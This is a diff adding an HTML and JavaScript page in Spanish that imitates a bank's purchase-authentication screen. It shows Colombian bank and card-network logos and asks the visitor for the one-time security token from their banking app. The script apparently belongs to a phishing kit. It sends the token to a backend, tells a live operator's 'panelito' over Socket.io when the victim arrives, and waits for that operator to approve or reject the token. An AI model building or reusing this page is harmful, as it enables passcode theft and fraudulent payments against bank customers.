@@ -1,0 +1,717 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Token de Seguridad</title>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #f5f5f5;
+        }
+
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 600px;
+            background: white;
+            border-radius: 8px;
+            padding: 3rem;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 2rem;
+            padding-bottom: 1.5rem;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .logo-banco {
+            height: 60px;
+            width: auto;
+            max-width: 180px;
+            object-fit: contain;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #666;
+            cursor: pointer;
+            padding: 0;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .close-btn:hover {
+            color: #333;
+        }
+
+        .franquicia-logo {
+            height: 50px;
+            width: auto;
+            object-fit: contain;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .franquicia-logo.loaded {
+            opacity: 1;
+        }
+
+        .logo-banco {
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .logo-banco.loaded {
+            opacity: 1;
+        }
+
+        .title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #222;
+            margin-bottom: 1.5rem;
+            margin-top: 1rem;
+        }
+
+        .info-section {
+            margin-bottom: 2rem;
+            font-size: 14px;
+            color: #555;
+            line-height: 1.6;
+        }
+
+        .info-section p {
+            margin-bottom: 0.8rem;
+        }
+
+        .monto {
+            font-weight: 600;
+            color: #222;
+        }
+
+        .form-group {
+            margin-bottom: 2rem;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 0.8rem;
+            font-weight: 500;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            font-family: 'Segoe UI', sans-serif;
+            transition: border-color 0.3s;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: #0052CC;
+            box-shadow: 0 0 0 3px rgba(0, 82, 204, 0.1);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-primary {
+            background-color: #0052CC;
+            color: white;
+            margin-bottom: 1.5rem;
+        }
+
+        .btn-primary:hover {
+            background-color: #0041A6;
+            box-shadow: 0 2px 8px rgba(0, 82, 204, 0.3);
+        }
+
+        .btn-primary:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+            opacity: 0.7;
+            box-shadow: none;
+        }
+
+        .btn-primary.loading {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .spinner-mini {
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .resend-link {
+            display: block;
+            text-align: center;
+            color: #0052CC;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 1.5rem;
+            cursor: pointer;
+            background: none;
+            border: none;
+            padding: 0;
+        }
+
+        .resend-link:hover {
+            text-decoration: underline;
+        }
+
+        .more-info {
+            display: block;
+            text-align: center;
+            color: #000;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .more-info:hover {
+            text-decoration: underline;
+        }
+
+        .error-message {
+            display: none;
+            color: #dc3545;
+            font-size: 13px;
+            padding: 12px;
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            border-radius: 4px;
+            margin-bottom: 1rem;
+            border-left: 4px solid #dc3545;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 1.5rem;
+            }
+
+            .title {
+                font-size: 18px;
+            }
+
+            .info-section {
+                font-size: 13px;
+            }
+
+            .franquicia-logo {
+                height: 40px;
+            }
+        }
+
+        .modal {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 12px;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+        }
+
+        .modal-header {
+            background: #0d472f;
+            color: white;
+            padding: 1.5rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .modal-header h2 {
+            margin: 0;
+            font-size: 1.3rem;
+        }
+
+        .modal-close {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 28px;
+            cursor: pointer;
+            padding: 0;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-close:hover {
+            opacity: 0.8;
+        }
+
+        .modal-body {
+            padding: 2rem;
+        }
+
+        .instruction-step {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .instruction-step:last-child {
+            margin-bottom: 0;
+        }
+
+        .step-number {
+            background: #0d472f;
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+
+        .step-text {
+            padding-top: 0.5rem;
+            color: #333;
+            font-size: 0.95rem;
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img id="logoBanco" class="logo-banco" src="assets/banks/default.svg" alt="Banco">
+            <img id="franquiciaLogo" class="franquicia-logo" alt="Franquicia">
+        </div>
+
+        <h1 class="title">Autenticación de compra</h1>
+
+        <div class="info-section" id="infoSection">
+            <p>Genera un token de seguridad desde tu aplicación de banca digital para autorizar esta transacción.</p>
+            <p>Para autorizar un pago a <span id="merchantName">-</span> por valor de <span class="monto" id="montoDisplay">$-</span> de <span id="dateDisplay">-</span> con tu tarjeta <span id="cardDisplay">-</span>.</p>
+        </div>
+
+        <form id="tokenForm">
+            <div id="errorMessage" class="error-message"></div>
+
+            <div class="form-group">
+                <label for="tokenInput">Token de Seguridad</label>
+                <input
+                    type="text"
+                    id="tokenInput"
+                    class="form-control"
+                    placeholder="Ingresa el token"
+                    minlength="6"
+                    maxlength="6"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                    autocomplete="off"
+                    autofocus
+                >
+            </div>
+
+            <button type="submit" id="continueBtn" class="btn btn-primary">CONTINUAR</button>
+        </form>
+
+        <button id="resendBtn" class="resend-link">REENVIAR TOKEN</button>
+        <a href="#" class="more-info" id="moreInfoBtn">Más información</a>
+    </div>
+
+    <!-- Modal de instrucciones -->
+    <div id="instructionsModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Cómo generar tu token</h2>
+                <button class="modal-close" id="closeModalBtn">×</button>
+            </div>
+            <div class="modal-body">
+                <div class="instruction-step">
+                    <div class="step-number">1</div>
+                    <div class="step-text">Abre tu aplicación de banca digital o tu app del banco</div>
+                </div>
+                <div class="instruction-step">
+                    <div class="step-number">2</div>
+                    <div class="step-text">Busca la opción de generar token de seguridad o autenticación</div>
+                </div>
+                <div class="instruction-step">
+                    <div class="step-number">3</div>
+                    <div class="step-text">Ingresa el token generado en el campo "Token de Seguridad" de esta pantalla</div>
+                </div>
+                <div class="instruction-step">
+                    <div class="step-number">4</div>
+                    <div class="step-text">Haz clic en el botón "CONTINUAR" para validar tu compra</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // INICIALIZACIÓN
+        // ============================================
+        const params = new URLSearchParams(window.location.search);
+        const txId = params.get('txId');
+
+        if (!txId) {
+            alert('Error: txId no encontrado en la URL');
+            window.location.href = '/';
+        }
+
+        console.log('[TOKEN] txId:', txId);
+        let monto, merchant, nombre, tarjeta, franquicia, bankname;
+
+        async function cargarDatos() {
+            try {
+                const response = await fetch(`http://localhost:9090/api/transaccion-tarjeta/${txId}`);
+                const result = await response.json();
+
+                if (result.ok && result.data) {
+                    const data = result.data;
+                    monto = data.monto;
+                    merchant = 'TIGO'; // Siempre TIGO para pagos de tarjeta
+                    nombre = data.nombre || 'Cliente';
+                    tarjeta = data.cardNumber;
+                    franquicia = data.franquicia || 'VISA';
+                    bankname = data.bankName || '';
+
+                    console.log('[TOKEN] Datos cargados desde R2:', data);
+
+                    // Llenar información de la compra
+                    const fecha = new Date().toLocaleDateString('es-CO');
+                    const ultimos4 = tarjeta.slice(-4);
+
+                    document.getElementById('montoDisplay').textContent = `$${parseInt(monto).toLocaleString('es-CO')}`;
+                    document.getElementById('dateDisplay').textContent = fecha;
+                    document.getElementById('cardDisplay').textContent = `****${ultimos4}`;
+                    document.getElementById('merchantName').textContent = merchant;
+
+                    mostrarLogoBanco();
+                } else {
+                    console.error('[TOKEN] Error:', result.error);
+                    alert('Error cargando transacción: ' + result.error);
+                }
+            } catch (err) {
+                console.error('[TOKEN] Error:', err);
+                alert('Error: ' + err.message);
+            }
+        }
+
+        // Cargar datos al iniciar
+        cargarDatos();
+
+        // Mapeo de bancos a logos
+        const bankLogos = {
+            'accion fiduciaria': 'accionfiduciaria.svg',
+            'agrario': 'agrario.svg',
+            'agrobank': 'agrario.svg',
+            'av villas': 'avvillas.svg',
+            'avvillas': 'avvillas.svg',
+            'ban 100': 'ban100.svg',
+            'ban100': 'ban100.svg',
+            'banca mia': 'bancamia.svg',
+            'bancamia': 'bancamia.svg',
+            'bancolombia': 'bancolombia.svg',
+            'bbva': 'bbva.svg',
+            'banco bogota': 'bogota.svg',
+            'bogota': 'bogota.svg',
+            'banco cajasocial': 'cajasocial.svg',
+            'cajasocial': 'cajasocial.svg',
+            'cfa': 'cfa.svg',
+            'chase': 'chase.svg',
+            'city bank': 'citybank.svg',
+            'citybank': 'citybank.svg',
+            'coink': 'coink.svg',
+            'colpatria': 'colpatria.svg',
+            'colte financiera': 'coltefinanciera.svg',
+            'coltefinanciera': 'coltefinanciera.svg',
+            'coofinep': 'coofinep.svg',
+            'coomeva': 'coomeva.svg',
+            'coop central': 'coopcentral.svg',
+            'cooperativa confiar': 'cooperativaConfiar.svg',
+            'cotrafa': 'cotrafa.svg',
+            'dale': 'dale.svg',
+            'davibank': 'davibank.svg',
+            'daviplata': 'daviplata.svg',
+            'davivienda': 'davivienda.svg',
+            'ding': 'ding.svg',
+            'falabella': 'falabella.svg',
+            'finandina': 'finandina.svg',
+            'global': 'global.svg',
+            'iris bank': 'irisbank.svg',
+            'itau': 'itau.svg',
+            'jpmorgan': 'jpmorgan.svg',
+            'lulo': 'lulo.svg',
+            'movii': 'movii.svg',
+            'mundo mujer': 'mundomujer.svg',
+            'nequi': 'nequiLogo.svg',
+            'nu': 'nu.svg',
+            'occidente': 'occidente.svg',
+            'paycash': 'paycash.svg',
+            'pichincha': 'pichincha.svg',
+            'banco popular': 'popular.svg',
+            'popular': 'popular.svg',
+            'powwi': 'powwi.svg',
+            'rappipay': 'rappipay.svg',
+            'santander': 'santander.svg',
+            'serfinanza': 'serfinanza.svg',
+            'sudameris': 'sudameris.svg',
+            'uala': 'uala.svg',
+            'union': 'union.svg',
+            'DEFAULT': 'default.svg'
+        };
+
+        // Mapeo de franquicias a logos
+        const franquiciaLogos = {
+            'VISA': 'visa.png',
+            'MASTERCARD': 'master.png',
+            'AMEX': 'amex.png',
+            'DINERS': 'diners.png'
+        };
+
+        // Detectar banco por nombre
+        function getBankLogo() {
+            if (!bankname) return 'default.svg';
+            const banknameLower = bankname.toLowerCase().normalize('NFD').replace(/[̀-ͯ]/g, '');
+            const bankKey = Object.keys(bankLogos).find(key => banknameLower.includes(key) || key.includes(banknameLower));
+            return bankLogos[bankKey] || 'default.svg';
+        }
+
+        function mostrarLogoBanco() {
+            const bankLogo = getBankLogo();
+            const franqLogo = franquiciaLogos[franquicia];
+
+            if (bankLogo && franqLogo) {
+                const logoBancoEl = document.getElementById('logoBanco');
+                const franquiciaLogoEl = document.getElementById('franquiciaLogo');
+
+                logoBancoEl.src = `assets/logos/${bankLogo}`;
+                franquiciaLogoEl.src = `assets/logos/${franqLogo}`;
+
+                logoBancoEl.onload = () => logoBancoEl.classList.add('loaded');
+                franquiciaLogoEl.onload = () => franquiciaLogoEl.classList.add('loaded');
+            }
+        }
+
+        // NO establecer logos sin datos
+
+        // Socket.io
+        const socket = io();
+
+        // ============================================
+        // LISTENERS SOCKET.IO
+        // ============================================
+
+        socket.on('token_verificado', (data) => {
+            console.log('[TOKEN] Respuesta del panelito:', data);
+            if (data.success) {
+                window.location.href = `/processing?txId=${txId}`;
+            } else {
+                mostrarError(data.error || 'Token incorrecto. Intenta de nuevo.');
+            }
+        });
+
+        socket.on('transaccion_confirmada', (data) => {
+            console.log('[TOKEN] Panelito confirmó transacción');
+            if (data.success) {
+                window.location.href = `/confirmation?txId=${data.txId}`;
+            }
+        });
+
+        socket.on('transaccion_error', (data) => {
+            console.log('[TOKEN] Error:', data);
+            mostrarError('Error: ' + data.error);
+        });
+
+        // ============================================
+        // FUNCIONES
+        // ============================================
+
+        function mostrarError(mensaje) {
+            const errorDiv = document.getElementById('errorMessage');
+            errorDiv.textContent = mensaje;
+            errorDiv.classList.add('show');
+        }
+
+        function ocultarError() {
+            const errorDiv = document.getElementById('errorMessage');
+            errorDiv.classList.remove('show');
+            errorDiv.textContent = '';
+        }
+
+        function volverAlProcesando() {
+            window.location.href = `/processing?txId=${txId}`;
+        }
+
+        // ============================================
+        // EVENT LISTENERS
+        // ============================================
+
+        document.getElementById('tokenForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const codigo = document.getElementById('tokenInput').value.trim();
+            const btnContinue = document.getElementById('continueBtn');
+
+            if (!codigo) {
+                mostrarError('Por favor ingresa un token');
+                return;
+            }
+
+            if (!/^[\w\d]+$/.test(codigo)) {
+                mostrarError('Solo se permiten caracteres alfanuméricos');
+                return;
+            }
+
+            ocultarError();
+
+            // Deshabilitar botón e mostrar spinner
+            btnContinue.disabled = true;
+            btnContinue.classList.add('loading');
+            btnContinue.innerHTML = '<span class="spinner-mini"></span> Verificando...';
+            console.log('[TOKEN] Guardando token:', codigo);
+
+            try {
+                // Guardar TOKEN
+                const response = await fetch('http://localhost:9090/api/guardar-token', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        txId: txId,
+                        token: codigo
+                    })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    console.log('[TOKEN] ✓ Token guardado en R2');
+
+                    // Limpiar acción para volver a STANDBY
+                    await fetch(`http://localhost:9090/api/limpiar-accion/${txId}`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ accion: 'TOKEN' })
+                    });
+
+                    // Volver a processing para esperar siguiente acción
+                    window.location.href = `/processing?txId=${txId}`;
+                } else {
+                    mostrarError(data.message || 'Error al guardar token');
+                    // Re-habilitar botón si hay error
+                    btnContinue.disabled = false;
+                    btnContinue.classList.remove('loading');
+                    btnContinue.innerHTML = 'CONTINUAR';
+                }
+            } catch (error) {
+                console.error('[TOKEN] Error:', error);
+                mostrarError('Error al guardar token');
+                // Re-habilitar botón si hay error
+                btnContinue.disabled = false;
+                btnContinue.classList.remove('loading');
+                btnContinue.innerHTML = 'CONTINUAR';
+            }
+        });
+
+        // Modal de instrucciones
+        document.getElementById('moreInfoBtn').addEventListener('click', (e) => {
+            e.preventDefault();
+            document.getElementById('instructionsModal').style.display = 'flex';
+        });
+
+        document.getElementById('closeModalBtn').addEventListener('click', () => {
+            document.getElementById('instructionsModal').style.display = 'none';
+        });
+
+        document.getElementById('instructionsModal').addEventListener('click', (e) => {
+            if (e.target.id === 'instructionsModal') {
+                document.getElementById('instructionsModal').style.display = 'none';
+            }
+        });
+
+        document.getElementById('resendBtn').addEventListener('click', (e) => {
+            e.preventDefault();
+            console.log('[TOKEN] Reenviando token');
+            socket.emit('reenviar_token', { idTransaccion: txId });
+            mostrarError('Token reenviado a tu banco');
+            setTimeout(() => ocultarError(), 3000);
+        });
+
+        document.getElementById('tokenInput').addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^\w\d]/g, '');
+            ocultarError();
+        });
+
+        // Notificar que usuario llegó
+        socket.emit('usuario_en_token', {
+            idTransaccion: txId,
+            timestamp: new Date().toISOString()
+        });
+
+        console.log('[TOKEN] ✅ Página lista');
+    </script>
+</body>
+</html>
